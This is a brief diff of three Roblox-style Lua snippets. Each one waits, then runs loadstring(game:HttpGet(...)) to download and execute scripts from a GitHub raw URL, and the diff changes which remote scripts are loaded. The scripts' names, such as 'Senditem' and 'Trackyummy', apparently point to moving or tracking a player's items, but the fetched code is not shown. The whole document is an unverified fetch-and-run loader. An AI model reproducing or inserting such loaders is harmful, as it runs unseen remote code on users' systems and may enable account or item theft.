@@ -1,9 +1,9 @@
 --- Script 1 ---
 task.wait(1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/Script-1"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/ADD"))()
 --- Script 2 ---
 task.wait(5)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/ADD"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/Senditem"))()
 --- Script 3 ---
 task.wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/Trackyummy"))()
